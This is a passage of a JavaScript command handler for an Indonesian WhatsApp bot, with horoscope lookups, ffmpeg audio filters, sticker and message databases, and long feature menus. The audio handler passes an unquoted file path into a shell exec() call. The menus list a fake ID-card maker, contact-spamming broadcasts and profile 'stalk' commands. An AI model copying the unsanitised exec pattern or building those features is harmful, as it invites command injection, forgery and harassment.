                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`, m)
            }
            break
            case 'memancing': {
                if (!text) return newReply(`Contoh : ${prefix + command} 12, 1, 2022`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
                if (!text) return newReply(`Contoh : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'zodiak': case 'zodiac': {
                if (!text) return newReply(`Contoh : ${prefix+ command} 7 7 2005`)
                let zodiak = [
                    ["capricorn", new Date(1970, 0, 1)],
                    ["aquarius", new Date(1970, 0, 20)],
                    ["pisces", new Date(1970, 1, 19)],
                    ["aries", new Date(1970, 2, 21)],
                    ["taurus", new Date(1970, 3, 21)],
                    ["gemini", new Date(1970, 4, 21)],
                    ["cancer", new Date(1970, 5, 22)],
                    ["leo", new Date(1970, 6, 23)],
                    ["virgo", new Date(1970, 7, 23)],
                    ["libra", new Date(1970, 8, 23)],
                    ["scorpio", new Date(1970, 9, 23)],
                    ["sagittarius", new Date(1970, 10, 22)],
                    ["capricorn", new Date(1970, 11, 22)]
                ].reverse()

                function getZodiac(month, day) {
                    let d = new Date(1970, month - 1, day)
                    return zodiak.find(([_,_d]) => d >= _d)[0]
                }
                let date = new Date(text)
                if (date == 'Invalid Date') return date
                let d = new Date()
                let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
                let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

                let zodiac = await getZodiac(birth[1], birth[2])
                
                let anu = await primbon.zodiak(zodiac)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'shio': {
                if (!text) return newReply(`Contoh : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
                let anu = await primbon.shio(text)
                if (anu.status == false) return newReply(anu.message)
                conn.sendText(m.chat, `• *Hasil :* ${anu.message}`, m)
            }
            break
            
            case 'bass': 
            case 'blown': 
            case 'deep': 
            case 'earrape': 
            case 'fast': 
            case 'fat': 
            case 'nightcore': 
            case 'reverse': 
            case 'robot': 
            case 'slow': 
            case 'smooth': 
            case 'tupai': {
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                newReply(mess.wait)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return newReply(err)
                let buff = fs.readFileSync(ran)
                conn.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else newReply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                newReply(e)
                }
                }
            break
            
            case 'setcmd': {
                if (!m.quoted) return newReply('Reply Pesan!')
                if (!m.quoted.fileSha256) return newReply('SHA256 Hash Tidak Ditemukan ❎')
                if (!text) return newReply(`Untuk Command Apa?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return newReply('Anda Tidak Diizinkan Untuk Mengubah Perintah Stiker Ini ❎')
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: +new Date,
                    locked: false,
                }
                newReply(mess.done)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return newReply(`Tidak Ada Hash`)
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return newReply('Anda Tidak Diizinkan Untuk Mengubah Perintah Stiker Ini ❎')
                delete global.db.data.sticker[hash]
                newReply(mess.done)
            }
            break
            case 'listcmd': {
                let teks = `*List Hash 🚀*
Info: *bold* hash is Locked 🔒

*Hash ☕ :*
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                conn.sendText(m.chat, teks, m, {
                    mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a, b) => [...a, ...b], [])
                })
            }
            break
            case 'lockcmd': {
                if (!isCreator) return newReply(mess.owner)
                if (!m.quoted) return newReply('Reply Pesan!')
                if (!m.quoted.fileSha256) return newReply('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) return newReply('Hash Not Found In Database')
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                newReply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) return newReply('Reply Message Yang Ingin Disave Di Database')
                if (!text) return newReply(`Contoh : ${prefix + command} Nama File`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return newReply(`'${text}' Telah Terdaftar Di List Pesan`)
                msgs[text.toLowerCase()] = quoted.fakeObj
                newReply(`Berhasil Menambahkan Pesan Di List Pesan Sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return newReply(`Contoh : ${prefix + command} File Name\n\nLihat List Pesan Dengan ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return newReply(`'${text}' Tidak Terdaftar Di List Pesan`)
                conn.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
                let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => {
                    return {
                        nama,
                        ...isi
                    }
                })
                let teks = 'LIST DATABASE 📂\n\n'
                for (let i of seplit) {
                    teks += `📛 *Name :* ${i.nama}`
                    teks += `🚀 *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
                }
                newReply(teks)
            }
            break
            case 'delmsg':
            case 'deletemsg': {
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return newReply(`'${text}' tidak terdaftar didalam list pesan`)
                delete msgs[text.toLowerCase()]
                newReply(`Berhasil menghapus '${text}' dari list pesan`)
            }
            break
            
            case 'menu':
case 'help': {
    let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   
${readmore}
乂 *S U B -- M E N U*
    ☍ ${prefix}allmenu
    ☍ ${prefix}ownermenu
    ☍ ${prefix}funmenu
    ☍ ${prefix}mainmenu
    ☍ ${prefix}premmenu
    ☍ ${prefix}primbonmenu
    ☍ ${prefix}groupmenu
    ☍ ${prefix}datamenu
    ☍ ${prefix}ramdonmenu
    ☍ ${prefix}asupanmenu
    ☍ ${prefix}toolsmenu
    ☍ ${prefix}creatormenu
    ☍ ${prefix}islammenu
    ☍ ${prefix}downmenu
    ☍ ${prefix}ephoto1
    ☍ ${prefix}photooxy1
    ☍ ${prefix}textpro1
    ☍ ${prefix}textpro2
    ☍ ${prefix}aimenu
    ☍ ${prefix}infomenu
    ☍ ${prefix}animemenu
    ☍ ${prefix}convertmenu
    ☍ ${prefix}stalkmenu
    ☍ ${prefix}mememenu`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'allmenu': {
    let anu =`Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   
乂 *S U B -- M E N U*
    ☍ ${prefix}allmenu
    ☍ ${prefix}ownermenu
    ☍ ${prefix}funmenu
    ☍ ${prefix}mainmenu
    ☍ ${prefix}premmenu
    ☍ ${prefix}primbonmenu
    ☍ ${prefix}groupmenu
    ☍ ${prefix}datamenu
    ☍ ${prefix}ramdonmenu
    ☍ ${prefix}asupanmenu
    ☍ ${prefix}toolsmenu
    ☍ ${prefix}creatormenu
    ☍ ${prefix}islammenu
    ☍ ${prefix}downmenu
    ☍ ${prefix}ephoto1
    ☍ ${prefix}photooxy1
    ☍ ${prefix}textpro1
    ☍ ${prefix}textpro2
    ☍ ${prefix}aimenu
    ☍ ${prefix}infomenu
    ☍ ${prefix}animemenu
    ☍ ${prefix}convertmenu
    ☍ ${prefix}stalkmenu
    ☍ ${prefix}mememenu
${readmore}
乂 *O W N E R  M E N U*
☍ ${prefix}listpc
☍ ${prefix}listgc
☍ ${prefix}public
☍ ${prefix}self
☍ ${prefix}enc
☍ ${prefix}pushkontak
☍ ${prefix}bcgc
☍ ${prefix}bc
☍ ${prefix}lockcmd
☍ ${prefix}addprem
☍ ${prefix}delprem
☍ ${prefix}addlimit
☍ ${prefix}dellimit
☍ ${prefix}addvn
☍ ${prefix}delvn
☍ ${prefix}myip
☍ ${prefix}chat
☍ ${prefix}react
☍ ${prefix}shutdown
☍ ${prefix}join
☍ ${prefix}leave
☍ ${prefix}setexif
☍ ${prefix}setppbot
☍ ${prefix}setppbot full
☍ ${prefix}setnamabot
☍ ${prefix}setbiobot
☍ ${prefix}block
☍ ${prefix}unblock
☍  >
☍  =>

乂 *F U N   M E N U*
☍ ${prefix}apakah
☍ ${prefix}bisakah
☍ ${prefix}bagaimanakah
☍ ${prefix}rate
☍ ${prefix}gantengcek
☍ ${prefix}cekganteng
☍ ${prefix}cantikcek
☍ ${prefix}cekcantik
☍ ${prefix}sangecek
☍ ${prefix}ceksange
☍ ${prefix}gaycek
☍ ${prefix}cekgay
☍ ${prefix}lesbicek
☍ ${prefix}ceklesbi
☍ ${prefix}kapankah
☍ ${prefix}wangy
☍ ${prefix}cekmati
☍ ${prefix}halah
☍ ${prefix}hilih
☍ ${prefix}huluh
☍ ${prefix}heleh
☍ ${prefix}holoh

乂 *M A I N  M E N U*
☍ ${prefix}owner
☍ ${prefix}ping
☍ ${prefix}menu
☍ ${prefix}speedtest
☍ ${prefix}script
☍ ${prefix}tqto
☍ ${prefix}runtime
☍ ${prefix}ceklimit
☍ ${prefix}buyprem

乂 *P R E M I U M  M E N U*
☍ ${prefix}ktpmaker
☍ ${prefix}remini
☍ ${prefix}jadianime
☍ ${prefix}art
☍ ${prefix}bts
☍ ${prefix}exo
☍ ${prefix}elf
☍ ${prefix}loli
☍ ${prefix}neko
☍ ${prefix}waifu
☍ ${prefix}shota
☍ ${prefix}husbu
☍ ${prefix}sagiri
☍ ${prefix}shinobu
☍ ${prefix}megumin
☍ ${prefix}wallnime

乂 *P R I M B O N  M E N U*
☍ ${prefix}nomorhoki
☍ ${prefix}artimimpi
☍ ${prefix}artinama
☍ ${prefix}ramaljodoh
☍ ${prefix}ramaljodohbali
☍ ${prefix}suamiistri
☍ ${prefix}ramalcinta
☍ ${prefix}cocoknama
☍ ${prefix}pasangan
☍ ${prefix}jadiannikah
☍ ${prefix}sifatusaha
☍ ${prefix}rezeki
☍ ${prefix}pekerjaan
☍ ${prefix}nasib
☍ ${prefix}penyakit
☍ ${prefix}tarot
☍ ${prefix}fengshui
☍ ${prefix}haribaik
☍ ${prefix}harisangar
☍ ${prefix}harisial
☍ ${prefix}nagahari
☍ ${prefix}arahrezeki
☍ ${prefix}peruntungan
☍ ${prefix}weton
☍ ${prefix}karakter
☍ ${prefix}keberuntungan
☍ ${prefix}memancing
☍ ${prefix}masasubur
☍ ${prefix}zodiak
☍ ${prefix}shio

乂 *G R O U P  M E N U*
☍ ${prefix}kick
☍ ${prefix}add
☍ ${prefix}culik
☍ ${prefix}promote
☍ ${prefix}demote
☍ ${prefix}setname
☍ ${prefix}setdesc
☍ ${prefix}setppgc
☍ ${prefix}tagall
☍ ${prefix}hidetag
☍ ${prefix}totag
☍ ${prefix}antilink
☍ ${prefix}antilinkyt
☍ ${prefix}antilinktt
☍ ${prefix}mutegc
☍ ${prefix}ephemeral
☍ ${prefix}group
☍ ${prefix}editinfo
☍ ${prefix}linkgc
☍ ${prefix}revoke
☍ ${prefix}liston

乂 *D A T A  M E N U*
☍ ${prefix}setcmd [reply sticker/pesan]
☍ ${prefix}listcmd
☍ ${prefix}delcmd [reply sticker/pesan]
☍ ${prefix}lockcmd
☍ ${prefix}addmsg
☍ ${prefix}listmsg
☍ ${prefix}getmsg
☍ ${prefix}delmsg

乂 *R A M D O N  M E N U*
☍ ${prefix}pokemon
☍ ${prefix}rize
☍ ${prefix}sagiri
☍ ${prefix}aesthetic
☍ ${prefix}anjing
☍ ${prefix}blankpink
☍ ${prefix}boneka
☍ ${prefix}hekel
☍ ${prefix}justina
☍ ${prefix}kpop
☍ ${prefix}kucing
☍ ${prefix}mobil
☍ ${prefix}motor
☍ ${prefix}pubg
☍ ${prefix}rose
☍ ${prefix}ryujin
☍ ${prefix}wallhp
☍ ${prefix}cyberspace
☍ ${prefix}mountain
☍ ${prefix}programming
☍ ${prefix}technology 
☍ ${prefix}couple
☍ ${prefix}wallpaper

乂 *A S U P A N  M E N U*
☍ ${prefix}cecan
☍ ${prefix}china
☍ ${prefix}cogan
☍ ${prefix}indonesia
☍ ${prefix}japan
☍ ${prefix}korea
☍ ${prefix}malaysia
☍ ${prefix}thailand
☍ ${prefix}vietnam

乂 *T O O L S  M E N U*
☍ ${prefix}style
☍ ${prefix}delete
☍ ${prefix}quoted
☍ ${prefix}ebinary
☍ ${prefix}dbinary
☍ ${prefix}wikimedia
☍ ${prefix}bass
☍ ${prefix}blown
☍ ${prefix}deep
☍ ${prefix}earrape
☍ ${prefix}fast
☍ ${prefix}fat
☍ ${prefix}nightcore
☍ ${prefix}reverse
☍ ${prefix}robot
☍ ${prefix}slow
☍ ${prefix}tupai

乂 *C R E A T O R  I M A G E*
☍ ${prefix}tololsertifikat
☍ ${prefix}bucinsertifikat
☍ ${prefix}pacarsertifikat
☍ ${prefix}ttp
☍ ${prefix}attp
☍ ${prefix}attp2
☍ ${prefix}qcimg
☍ ${prefix}qc

乂 *I S L A M  M E N U*
☍ ${prefix}asmaulhusna
☍ ${prefix}alquranaudio
☍ ${prefix}alquran
☍ ${prefix}jadwalsolat
☍ ${prefix}kisahnabi
☍ ${prefix}listsurah
☍ ${prefix}iqro
☍ ${prefix}juzamma
☍ ${prefix}hadist
☍ ${prefix}tasfirsurah

乂 *D O W N  M E N U*
☍ ${prefix}ytplay
☍ ${prefix}ytmp3
☍ ${prefix}ytmp4
☍ ${prefix}tiktok
☍ ${prefix}tiktokaudio
☍ ${prefix}igdl
☍ ${prefix}igdl2
☍ ${prefix}twtdl
☍ ${prefix}fbdl
☍ ${prefix}gitclone

乂 *E P H O T O _1_*
☍ ${prefix}wetglass
☍ ${prefix}multicolor3d
☍ ${prefix}watercolor
☍ ${prefix}luxurygold
☍ ${prefix}galaxywallpaper
☍ ${prefix}lighttext
☍ ${prefix}beautifulflower
☍ ${prefix}puppycute
☍ ${prefix}royaltext
☍ ${prefix}heartshaped
☍ ${prefix}birthdaycake
☍ ${prefix}galaxystyle
☍ ${prefix}hologram3d
☍ ${prefix}greenneon
☍ ${prefix}glossychrome
☍ ${prefix}greenbush
☍ ${prefix}metallogo
☍ ${prefix}noeltext
☍ ${prefix}glittergold
☍ ${prefix}textcake
☍ ${prefix}starsnight
☍ ${prefix}wooden3d
☍ ${prefix}textbyname
☍ ${prefix}writegalacy
☍ ${prefix}galaxybat
☍ ${prefix}snow3d
☍ ${prefix}birthdayday
☍ ${prefix}goldplaybutton
☍ ${prefix}silverplaybutton
☍ ${prefix}freefire

乂 *P H O T O  O X Y _1_*
☍ ${prefix}shadow
☍ ${prefix}cup
☍ ${prefix}cup1
☍ ${prefix}romance
☍ ${prefix}smoke
☍ ${prefix}burnpaper
☍ ${prefix}lovemessage
☍ ${prefix}undergrass
☍ ${prefix}love
☍ ${prefix}coffe
☍ ${prefix}woodheart
☍ ${prefix}woodenboard
☍ ${prefix}summer3d
☍ ${prefix}wolfmetal
☍ ${prefix}nature3d
☍ ${prefix}underwater
☍ ${prefix}golderrose
☍ ${prefix}summernature
☍ ${prefix}letterleaves
☍ ${prefix}glowingneon
☍ ${prefix}fallleaves
☍ ${prefix}flamming
☍ ${prefix}harrypotter
☍ ${prefix}carvedwood

乂 *T E X T  P R O _1_*
☍ ${prefix}blackpink
☍ ${prefix}neon
☍ ${prefix}greenneon
☍ ${prefix}advanceglow
☍ ${prefix}futureneon
☍ ${prefix}sandwriting
☍ ${prefix}sandsummer
☍ ${prefix}sandengraved
☍ ${prefix}metaldark
☍ ${prefix}neonlight
☍ ${prefix}holographic
☍ ${prefix}text1917
☍ ${prefix}minion
☍ ${prefix}deluxesilver
☍ ${prefix}newyearcard
☍ ${prefix}bloodfrosted
☍ ${prefix}halloween
☍ ${prefix}jokerlogo
☍ ${prefix}fireworksparkle
☍ ${prefix}natureleaves
☍ ${prefix}bokeh
☍ ${prefix}toxic
☍ ${prefix}strawberry
☍ ${prefix}box3d
☍ ${prefix}roadwarning
☍ ${prefix}breakwall
☍ ${prefix}icecold
☍ ${prefix}luxury
☍ ${prefix}cloud
☍ ${prefix}summersand
☍ ${prefix}horrorblood
☍ ${prefix}thunder

乂 *T E X T  P R O _2_*
☍ ${prefix}pornhub
☍ ${prefix}glitch
☍ ${prefix}avenger
☍ ${prefix}space
☍ ${prefix}ninjalogo
☍ ${prefix}marvelstudio
☍ ${prefix}lionlogo
☍ ${prefix}wolflogo
☍ ${prefix}steel3d
☍ ${prefix}wallgravity

乂 *I N F O R M A T I O N*
☍ ${prefix}kbbi
☍ ${prefix}brainly
☍ ${prefix}roboguru
☍ ${prefix}jarak
☍ ${prefix}wikipedia
☍ ${prefix}translate
☍ ${prefix}jadwaltv
☍ ${prefix}jadwaltvnow
☍ ${prefix}jadwalbola
☍ ${prefix}newsinfo
☍ ${prefix}cnnindonesia
☍ ${prefix}cnnnasional
☍ ${prefix}cnninternasional
☍ ${prefix}infogempa
☍ ${prefix}infocuaca
☍ ${prefix}lirik
☍ ${prefix}kodepos
☍ ${prefix}infochat
☍ ${prefix}google
☍ ${prefix}gimage
☍ ${prefix}pinterest

乂 *A I  M E N U*
☍ ${prefix}ai
☍ ${prefix}ai2
☍ ${prefix}aiimage
☍ ${prefix}diffusion

乂 *A N I M E  M E N U*
☍ ${prefix}genshin
☍ ${prefix}akira
☍ ${prefix}akiyama
☍ ${prefix}ana
☍ ${prefix}asuna
☍ ${prefix}ayuzawa
☍ ${prefix}boruto
☍ ${prefix}chitoge
☍ ${prefix}deidara
☍ ${prefix}doraemon
☍ ${prefix}elaina
☍ ${prefix}emilia
☍ ${prefix}erza
☍ ${prefix}gremory
☍ ${prefix}hestia
☍ ${prefix}hinata
☍ ${prefix}inori
☍ ${prefix}isuzu
☍ ${prefix}itachi
☍ ${prefix}itori
☍ ${prefix}kaga
☍ ${prefix}kagura
☍ ${prefix}kakasih
☍ ${prefix}kaori
☍ ${prefix}keneki
☍ ${prefix}kotori
☍ ${prefix}kurumi
☍ ${prefix}loli
☍ ${prefix}madara
☍ ${prefix}mikasa
☍ ${prefix}miku
☍ ${prefix}minato
☍ ${prefix}naruto
☍ ${prefix}nezuko
☍ ${prefix}onepiece
☍ ${prefix}sakura
☍ ${prefix}sasuke
☍ ${prefix}shina
☍ ${prefix}shinka
☍ ${prefix}shizuka
☍ ${prefix}shota
☍ ${prefix}toukachan
☍ ${prefix}tsunade
☍ ${prefix}yuki

乂 *C O N V E R T  M E N U*
☍ ${prefix}stiker
☍ ${prefix}swm
☍ ${prefix}smeme
☍ ${prefix}emojimix
☍ ${prefix}emojimix2
☍ ${prefix}toimage
☍ ${prefix}tomp4
☍ ${prefix}toaudio
☍ ${prefix}tomp3
☍ ${prefix}tovn
☍ ${prefix}togif
☍ ${prefix}tourl

乂 *S T A L K E R  M E N U*
☍ ${prefix}igstalk
☍ ${prefix}ttstalk
☍ ${prefix}mlstalk
☍ ${prefix}ghstalk
☍ ${prefix}twstalk

乂 *M E M E  M E N U*
☍ ${prefix}darkjoke
☍ ${prefix}ramdommeme
☍ ${prefix}memeindo`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break
case 'ownermenu': {
    let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *O W N E R  M E N U*
☍ ${prefix}listpc
☍ ${prefix}listgc
☍ ${prefix}public
☍ ${prefix}self
☍ ${prefix}enc
☍ ${prefix}pushkontak
☍ ${prefix}bcgc
☍ ${prefix}bc
☍ ${prefix}lockcmd
☍ ${prefix}addprem
☍ ${prefix}delprem
☍ ${prefix}addlimit
☍ ${prefix}dellimit
☍ ${prefix}addvn
☍ ${prefix}delvn
☍ ${prefix}myip
☍ ${prefix}chat
☍ ${prefix}react
☍ ${prefix}shutdown
☍ ${prefix}join
☍ ${prefix}leave
☍ ${prefix}setexif
☍ ${prefix}setppbot
☍ ${prefix}setppbot full
☍ ${prefix}setnamabot
☍ ${prefix}setbiobot
☍ ${prefix}block
☍ ${prefix}unblock
☍  >
☍  =>`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break

case 'funmenu': {
    let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *F U N   M E N U*
☍ ${prefix}apakah
☍ ${prefix}bisakah
☍ ${prefix}bagaimanakah
☍ ${prefix}rate
☍ ${prefix}gantengcek
☍ ${prefix}cekganteng
☍ ${prefix}cantikcek
☍ ${prefix}cekcantik
☍ ${prefix}sangecek
☍ ${prefix}ceksange
☍ ${prefix}gaycek
☍ ${prefix}cekgay
☍ ${prefix}lesbicek
☍ ${prefix}ceklesbi
☍ ${prefix}kapankah
☍ ${prefix}wangy
☍ ${prefix}cekmati
☍ ${prefix}halah
☍ ${prefix}hilih
☍ ${prefix}huluh
☍ ${prefix}heleh
☍ ${prefix}holoh`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
        sourceUrl: "https://chat.whatsapp.com/HjPoA3EZ2mc22ngHjZJLbE",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
   })
}
break

case 'mainmenu': {
    let anu = `Hello ${pushname}\nI Am ${namabot} a whatsapp bot that can make it easier for you to solve problems with the internet quickly.

  ☍ *Mode:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *Bailyes:* -
  ☍ *Runtime:* ${runtime(process.uptime())}
  ☍ *Total User:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *Total Banned:* ${ban.length}
  ☍ *Total Fitur:* ${totalFitur()}
  
乂 *I N F O  U S E R*

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${isCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${isCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
   

乂 *M A I N  M E N U*
☍ ${prefix}owner
☍ ${prefix}ping
☍ ${prefix}menu
☍ ${prefix}speedtest
☍ ${prefix}script
☍ ${prefix}tqto
☍ ${prefix}runtime
☍ ${prefix}ceklimit
☍ ${prefix}buyprem`
conn.sendMessage(m.chat, {
    text: anu,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true, 
        title: `${ucapanWaktu} ${pushname}`,
        body: "AdrianTzy",
        thumbnailUrl: "https://telegra.ph/file/dd61c9986e9d11562958d.jpg",
